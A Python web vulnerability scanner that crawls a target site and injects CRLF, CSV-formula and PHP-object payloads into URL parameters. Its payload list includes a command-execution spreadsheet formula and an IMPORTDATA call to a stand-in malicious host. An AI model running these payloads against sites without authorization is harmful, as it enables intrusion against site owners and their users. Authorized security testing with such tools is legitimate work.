import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
import re
import sys
import time

# Constants
CRLF_PAYLOAD = "\r\nInjected-Header: injected_value\r\n"
CSV_PAYLOADS = [
    "=SUM(1,1)", 
    "=CMD|' /C calc'!A0", 
    "=IMPORTDATA(\"http://malicious.com\")",
    "+SUM(1,1)",
    "-SUM(1,1)",
    "@SUM(1,1)"
]
PHP_OBJECT_PAYLOAD = "O:1:\"A\":0:{}"  # Simplistic PHP serialized object (needs to be tailored)

USER_AGENT = "Vulnerability-Scanner/1.0"
TIMEOUT = 10  # seconds
DELAY_BETWEEN_REQUESTS = 1  # seconds to prevent overwhelming the server

class VulnerabilityScanner:
    def __init__(self, base_url, vulnerability_type):
        self.base_url = base_url
        self.vulnerability_type = vulnerability_type.lower()
        self.visited_urls = set()
        self.vulnerable_urls = []
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': USER_AGENT})

    def crawl(self, url):
        """Recursively crawl URLs starting from the base URL."""
        if url in self.visited_urls:
            return
        self.visited_urls.add(url)
        print(f"Crawling URL: {url}")
        try:
            response = self.session.get(url, timeout=TIMEOUT)
            if response.status_code != 200:
                print(f"Skipping URL {url} due to status code {response.status_code}")
                return
            soup = BeautifulSoup(response.text, 'html.parser')
            # Find all links
            for link in soup.find_all('a', href=True):
                href = link.get('href')
                full_url = urljoin(url, href)
                parsed_url = urlparse(full_url)
                # Only crawl URLs within the same domain
                if parsed_url.netloc == urlparse(self.base_url).netloc:
                    self.crawl(full_url)
        except requests.exceptions.RequestException as e:
            print(f"Error crawling URL {url}: {e}")

    def find_parameters(self, url):
        """Extract query parameters from a URL."""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        return params

    def inject_payloads(self, url, params):
        """Inject payloads based on the selected vulnerability."""
        if self.vulnerability_type == 'crlf':
            self.inject_crlf(url, params)
        elif self.vulnerability_type == 'csv':
            self.inject_csv(url, params)
        elif self.vulnerability_type == 'php_object':
            self.inject_php_object(url, params)
        else:
            print(f"Unsupported vulnerability type: {self.vulnerability_type}")

    def inject_crlf(self, url, params):
        """Inject CRLF payload into each parameter and test for vulnerabilities."""
        for param in params:
            original_value = params[param][0]
            injected_value = original_value + CRLF_PAYLOAD
            params_copy = params.copy()
            params_copy[param] = injected_value
            try:
                response = self.session.get(url, params=params_copy, timeout=TIMEOUT)
                # Check for injected headers or anomalies in response
                if self.detect_crlf_injection(response):
                    print(f"[VULNERABLE] CRLF Injection detected at {url} parameter '{param}'")
                    self.vulnerable_urls.append((url, param, 'CRLF Injection'))
            except requests.exceptions.RequestException as e:
                print(f"Error testing URL {url} with parameter '{param}': {e}")
            time.sleep(DELAY_BETWEEN_REQUESTS)

    def inject_csv(self, url, params):
        """Inject CSV payloads into each parameter and test for vulnerabilities."""
        for param in params:
            original_value = params[param][0]
            for payload in CSV_PAYLOADS:
                injected_value = payload
                params_copy = params.copy()
                params_copy[param] = injected_value
                try:
                    response = self.session.get(url, params=params_copy, timeout=TIMEOUT)
                    # Check if payload is reflected in CSV context
                    if self.detect_csv_injection(response, payload):
                        print(f"[VULNERABLE] CSV Injection detected at {url} parameter '{param}' with payload '{payload}'")
                        self.vulnerable_urls.append((url, param, f'CSV Injection with payload {payload}'))
                except requests.exceptions.RequestException as e:
                    print(f"Error testing URL {url} with parameter '{param}': {e}")
                time.sleep(DELAY_BETWEEN_REQUESTS)

    def inject_php_object(self, url, params):
        """Inject PHP Object payload into each parameter and test for vulnerabilities."""
        for param in params:
            original_value = params[param][0]
            injected_value = PHP_OBJECT_PAYLOAD
            params_copy = params.copy()
            params_copy[param] = injected_value
            try:
                response = self.session.get(url, params=params_copy, timeout=TIMEOUT)
                # Check for error messages or anomalies indicating PHP object handling
                if self.detect_php_object_injection(response):
                    print(f"[VULNERABLE] PHP Object Injection detected at {url} parameter '{param}'")
                    self.vulnerable_urls.append((url, param, 'PHP Object Injection'))
            except requests.exceptions.RequestException as e:
                print(f"Error testing URL {url} with parameter '{param}': {e}")
            time.sleep(DELAY_BETWEEN_REQUESTS)

    def detect_crlf_injection(self, response):
        """Detect CRLF injection by searching for injected headers or anomalies."""
        # Check for the injected header
        if 'Injected-Header' in response.headers:
            return True
        # Additionally, search for the payload in the response body
        if CRLF_PAYLOAD.strip() in response.text:
            return True
        return False

    def detect_csv_injection(self, response, payload):
        """Detect CSV injection by checking if the payload is reflected in CSV context."""
        # This simplistic approach checks if the payload appears in the response
        # In a real-world scenario, more sophisticated checks would be needed
        return payload in response.text

    def detect_php_object_injection(self, response):
        """Detect PHP Object Injection by looking for unserialize errors or unusual responses."""
        # Common indicators include PHP warnings or notices related to unserialize
        error_patterns = [
            "unserialize()",
            "PHP Warning",
            "PHP Notice",
            "Object of class",
            "invalid object",
            "unexpected end of string",
            "PHP Fatal error"
        ]
        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        return False

    def scan(self):
        """Perform the selected vulnerability scan."""
        print(f"Starting crawl on base URL: {self.base_url}")
        self.crawl(self.base_url)
        print("Crawling completed.")
        print(f"Found {len(self.visited_urls)} unique URLs.")
        print(f"Beginning {self.vulnerability_type.upper()} injection tests...")
        for url in self.visited_urls:
            params = self.find_parameters(url)
            if params:
                self.inject_payloads(url, params)
        print(f"{self.vulnerability_type.upper()} injection testing completed.")
        self.report()

    def report(self):
        """Generate a report of vulnerable URLs."""
        if self.vulnerable_urls:
            print("\n=== Vulnerability Report ===")
            for vuln in self.vulnerable_urls:
                print(f"Vulnerability: {vuln[2]} | URL: {vuln[0]} | Parameter: {vuln[1]}")
            print("=== End of Report ===")
        else:
            print(f"\nNo {self.vulnerability_type.upper()} vulnerabilities detected.")

def display_menu():
    """Display the vulnerability selection menu."""
    print("\n=== Vulnerability Scanner Menu ===")
    print("Select the vulnerability you want to scan for:")
    print("1. CRLF Injection")
    print("2. CSV Injection")
    print("3. PHP Object Injection")
    print("4. Exit")

def get_user_choice():
    """Get the user's menu choice."""
    while True:
        try:
            choice = int(input("Enter your choice (1-4): "))
            if choice in [1, 2, 3, 4]:
                return choice
            else:
                print("Please enter a valid option (1-4).")
        except ValueError:
            print("Invalid input. Please enter a number between 1 and 4.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python vulnerability_scanner.py <target_url>")
        sys.exit(1)
    target_url = sys.argv[1]
    # Validate URL
    if not re.match(r'^https?://', target_url):
        print("Please provide a valid URL starting with http:// or https://")
        sys.exit(1)
    
    while True:
        display_menu()
        choice = get_user_choice()
        if choice == 1:
            vuln_type = 'crlf'
        elif choice == 2:
            vuln_type = 'csv'
        elif choice == 3:
            vuln_type = 'php_object'
        elif choice == 4:
            print("Exiting the scanner. Stay secure!")
            sys.exit(0)
        
        scanner = VulnerabilityScanner(target_url, vuln_type)
        scanner.scan()
        
        # Ask if the user wants to perform another scan
        again = input("\nDo you want to perform another scan? (y/n): ").strip().lower()
        if again != 'y':
            print("Exiting the scanner. Stay secure!")
            sys.exit(0)
